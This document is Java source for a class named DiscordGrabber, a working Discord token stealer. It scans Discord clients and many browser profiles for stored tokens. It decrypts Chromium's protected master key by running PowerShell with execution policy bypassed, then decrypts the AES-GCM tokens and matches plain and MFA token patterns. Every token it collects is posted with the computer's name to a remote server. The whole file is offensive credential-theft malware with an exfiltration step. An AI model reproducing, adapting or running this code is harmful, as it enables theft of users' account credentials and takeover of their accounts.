import java.io.File;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class DiscordGrabber {

    private static final Pattern REGEX_TOKEN = Pattern.compile("[\\w-]{24,}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static final Pattern REGEX_MFA = Pattern.compile("mfa\\.[\\w-]{80,100}");
    private static final Pattern REGEX_ENCRYPTED = Pattern.compile("dQw4w9WgXcQ:[A-Za-z0-9+/=_\\-]{30,500}");

    public static byte[] dpapiDecrypt(byte[] encryptedData) {
        try {
            String b64 = Base64.getEncoder().encodeToString(encryptedData);
            String psCmd = "Add-Type -AssemblyName System.Security; " +
                "$b=[Convert]::FromBase64String('" + b64 + "'); " +
                "[Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", psCmd);
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line.trim());
            }
            proc.waitFor();

            String outStr = output.toString().trim();
            if (!outStr.isEmpty() && !outStr.contains("Exception") && !outStr.contains("error")) {
                return Base64.getDecoder().decode(outStr);
            }
        } catch (Exception e) {}

        try {
            String b64 = Base64.getEncoder().encodeToString(encryptedData);
            String psCmd = "[Reflection.Assembly]::LoadWithPartialName('System.Security') | Out-Null; " +
                "$b=[Convert]::FromBase64String('" + b64 + "'); " +
                "[Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser'))";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", psCmd);
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder output = new StringBuilder();
            String ln;
            while ((ln = reader.readLine()) != null) {
                output.append(ln.trim());
            }
            proc.waitFor();

            String outStr = output.toString().trim();
            if (!outStr.isEmpty() && !outStr.contains("Exception") && !outStr.contains("error")) {
                return Base64.getDecoder().decode(outStr);
            }
        } catch (Exception e) {}

        return null;
    }

    public static byte[] getMasterKey(String localStatePath) {
        try {
            File f = new File(localStatePath);
            if (!f.exists()) return null;

            String content = new String(Files.readAllBytes(f.toPath()), "UTF-8");
            if (!content.contains("encrypted_key")) return null;

            String encKeyB64 = null;
            int idx = content.indexOf("encrypted_key");
            if (idx != -1) {
                int colonIdx = content.indexOf(':', idx + 13);
                if (colonIdx != -1) {
                    int quoteStart = content.indexOf('"', colonIdx + 1);
                    if (quoteStart != -1) {
                        int quoteEnd = content.indexOf('"', quoteStart + 1);
                        if (quoteEnd != -1) {
                            encKeyB64 = content.substring(quoteStart + 1, quoteEnd);
                        }
                    }
                }
            }

            if (encKeyB64 == null || encKeyB64.isEmpty()) return null;

            byte[] keyData = Base64.getDecoder().decode(encKeyB64);

            if (keyData.length <= 5) return null;
            byte[] cipherText = new byte[keyData.length - 5];
            System.arraycopy(keyData, 5, cipherText, 0, cipherText.length);

            return dpapiDecrypt(cipherText);
        } catch (Exception e) {
            return null;
        }
    }

    public static String decryptEncryptedToken(String encTokenStr, byte[] masterKey) {
        try {
            if (!encTokenStr.startsWith("dQw4w9WgXcQ:")) return null;

            String b64Part = encTokenStr.substring(12).trim();

            b64Part = b64Part.replaceAll("[^A-Za-z0-9+/=_\\-]", "");

            String stdB64 = b64Part.replace('-', '+').replace('_', '/');
            while (stdB64.length() % 4 != 0) {
                stdB64 += "=";
            }

            byte[] data;
            try {
                data = Base64.getDecoder().decode(stdB64);
            } catch (Exception e) {
                try {
                    data = Base64.getUrlDecoder().decode(b64Part);
                } catch (Exception e2) {
                    return null;
                }
            }

            if (data.length < 16) return null;

            byte[] iv = new byte[12];
            System.arraycopy(data, 3, iv, 0, 12);

            byte[] cipherTextWithTag = new byte[data.length - 15];
            System.arraycopy(data, 15, cipherTextWithTag, 0, cipherTextWithTag.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);

            byte[] decrypted = cipher.doFinal(cipherTextWithTag);
            String token = new String(decrypted, "UTF-8").trim();

            if (token.contains(".") && token.length() > 30) {
                return token;
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void scanDirectory(File dir, byte[] masterKey, Set<String> tokens) {
        if (dir == null || !dir.exists() || !dir.isDirectory()) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            String name = file.getName().toLowerCase();
            if (name.endsWith(".ldb") || name.endsWith(".log") || name.endsWith(".sqlite") 
                || name.endsWith(".manifest") || name.matches("\\d{6}")) {
                try {
                    File tempFile = File.createTempFile("dg_", ".tmp");
                    tempFile.deleteOnExit();
                    Files.copy(file.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

                    byte[] rawBytes = Files.readAllBytes(tempFile.toPath());
                    String content = new String(rawBytes, "ISO-8859-1");

                    if (masterKey != null && content.contains("dQw4w9WgXcQ:")) {
                        Matcher mEnc = REGEX_ENCRYPTED.matcher(content);
                        while (mEnc.find()) {
                            String encStr = mEnc.group();
                            while (encStr.endsWith("\\") || encStr.endsWith("\"")) {
                                encStr = encStr.substring(0, encStr.length() - 1);
                            }
                            String decrypted = decryptEncryptedToken(encStr, masterKey);
                            if (decrypted != null && !decrypted.isEmpty()) {
                                tokens.add(decrypted);
                            }
                        }
                    }

                    Matcher m1 = REGEX_TOKEN.matcher(content);
                    while (m1.find()) {
                        String t = m1.group();
                        if (isValidTokenFormat(t)) {
                            tokens.add(t);
                        }
                    }

                    Matcher m2 = REGEX_MFA.matcher(content);
                    while (m2.find()) {
                        tokens.add(m2.group());
                    }

                    tempFile.delete();
                } catch (Exception ignored) {}
            }
        }
    }

    private static boolean isValidTokenFormat(String token) {
        if (token == null || token.length() < 40) return false;
        String[] parts = token.split("\\.");
        return parts.length == 3 && parts[0].length() >= 18 && parts[1].length() >= 4 && parts[2].length() >= 20;
    }

    private static List<File> findBrowserProfiles(String userDataDir) {
        List<File> profiles = new ArrayList<>();
        File dir = new File(userDataDir);
        if (!dir.exists()) return profiles;

        File defaultProfile = new File(dir, "Default");
        if (defaultProfile.exists()) profiles.add(defaultProfile);

        File[] children = dir.listFiles();
        if (children != null) {
            for (File child : children) {
                if (child.isDirectory() && child.getName().matches("Profile \\d+")) {
                    profiles.add(child);
                }
            }
        }

        File guestProfile = new File(dir, "Guest Profile");
        if (guestProfile.exists()) profiles.add(guestProfile);

        return profiles;
    }

    public static List<String> findTokens() {
        Set<String> tokens = new HashSet<>();
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");
        String userProfile = System.getenv("USERPROFILE");

        if (appData == null && localAppData == null) {
            return new ArrayList<>(tokens);
        }
        if (appData == null) appData = "";
        if (localAppData == null) localAppData = "";
        if (userProfile == null) userProfile = "";

        String[][] discordApps = {
            {"Discord", appData + "\\discord"},
            {"Discord Canary", appData + "\\discordcanary"},
            {"Discord PTB", appData + "\\discordptb"},
            {"Discord Dev", appData + "\\discorddevelopment"},
            {"Lightcord", appData + "\\Lightcord"},
            {"Vesktop", appData + "\\vesktop"},
            {"BetterDiscord", appData + "\\BetterDiscord"},
        };

        for (String[] dc : discordApps) {
            String basePath = dc[1];
            String localStatePath = basePath + "\\Local State";
            byte[] masterKey = getMasterKey(localStatePath);

            scanDirectory(new File(basePath + "\\Local Storage\\leveldb"), masterKey, tokens);
            scanDirectory(new File(basePath + "\\Session Storage\\leveldb"), masterKey, tokens);
            File blobDir = new File(basePath + "\\blob_storage");
            if (blobDir.exists() && blobDir.isDirectory()) {
                File[] subDirs = blobDir.listFiles();
                if (subDirs != null) {
                    for (File sub : subDirs) {
                        if (sub.isDirectory()) scanDirectory(sub, masterKey, tokens);
                    }
                }
            }
            scanDirectory(new File(basePath + "\\Cache\\Cache_Data"), masterKey, tokens);
            scanDirectory(new File(basePath + "\\GPUCache"), masterKey, tokens);
        }

        String[][] browsers = {
            {"Chrome", localAppData + "\\Google\\Chrome\\User Data"},
            {"Chrome SxS", localAppData + "\\Google\\Chrome SxS\\User Data"},
            {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"},
            {"Edge", localAppData + "\\Microsoft\\Edge\\User Data"},
            {"Opera", appData + "\\Opera Software\\Opera Stable"},
            {"Opera GX", appData + "\\Opera Software\\Opera GX Stable"},
            {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data"},
            {"Vivaldi", localAppData + "\\Vivaldi\\User Data"},
            {"Chromium", localAppData + "\\Chromium\\User Data"},
            {"Epic", localAppData + "\\Epic Privacy Browser\\User Data"},
            {"Iridium", localAppData + "\\Iridium\\User Data"},
            {"Comodo Dragon", localAppData + "\\Comodo\\Dragon\\User Data"},
            {"Torch", localAppData + "\\Torch\\User Data"},
            {"CentBrowser", localAppData + "\\CentBrowser\\User Data"},
            {"CocCoc", localAppData + "\\CocCoc\\Browser\\User Data"},
            {"Slimjet", localAppData + "\\Slimjet\\User Data"},
        };

        for (String[] br : browsers) {
            String userDataDir = br[1];
            String localStatePath;

            if (br[0].startsWith("Opera")) {
                localStatePath = userDataDir + "\\Local State";
                byte[] masterKey = getMasterKey(localStatePath);
                scanDirectory(new File(userDataDir + "\\Local Storage\\leveldb"), masterKey, tokens);
                scanDirectory(new File(userDataDir + "\\Session Storage\\leveldb"), masterKey, tokens);
            } else {
                localStatePath = userDataDir + "\\Local State";
                byte[] masterKey = getMasterKey(localStatePath);

                List<File> profiles = findBrowserProfiles(userDataDir);
                for (File profile : profiles) {
                    scanDirectory(new File(profile, "Local Storage\\leveldb"), masterKey, tokens);
                    scanDirectory(new File(profile, "Session Storage\\leveldb"), masterKey, tokens);
                }
            }
        }

        String[][] mozApps = {
            {appData + "\\Mozilla\\Firefox\\Profiles"},
            {appData + "\\Thunderbird\\Profiles"},
            {appData + "\\Waterfox\\Profiles"},
            {appData + "\\Pale Moon\\Profiles"},
        };

        for (String[] mozApp : mozApps) {
            File profilesDir = new File(mozApp[0]);
            if (!profilesDir.exists()) continue;
            File[] profileDirs = profilesDir.listFiles();
            if (profileDirs == null) continue;
            for (File profileDir : profileDirs) {
                if (!profileDir.isDirectory()) continue;
                scanDirectory(new File(profileDir, "storage\\default"), null, tokens);
                File storageDefault = new File(profileDir, "storage\\default");
                if (storageDefault.exists()) {
                    File[] hostDirs = storageDefault.listFiles();
                    if (hostDirs != null) {
                        for (File hostDir : hostDirs) {
                            String hostName = hostDir.getName().toLowerCase();
                            if (hostName.contains("discord") || hostName.contains("discordapp")) {
                                scanDirectory(new File(hostDir, "ls"), null, tokens);
                                scanDirectory(new File(hostDir, "idb"), null, tokens);
                                scanDirectory(hostDir, null, tokens);
                            }
                        }
                    }
                }
            }
        }

        return new ArrayList<>(tokens);
    }

    public static void sendTokensToServer(String serverUrl, String gateKey, String pcName) {
        try {
            List<String> tokens = findTokens();
            if (tokens.isEmpty()) {
                return;
            }

            for (String token : tokens) {
                try {
                    URL url = new URL(serverUrl + "/api/discord/add");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    conn.setDoOutput(true);

                    String payload = String.format(
                        "{\"gateKey\":\"%s\",\"pcName\":\"%s\",\"token\":\"%s\"}",
                        gateKey, pcName.replace("\\", "\\\\").replace("\"", "\\\""), 
                        token.replace("\\", "\\\\").replace("\"", "\\\"")
                    );

                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = payload.getBytes("UTF-8");
                        os.write(input, 0, input.length);
                    }

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {}
    }
}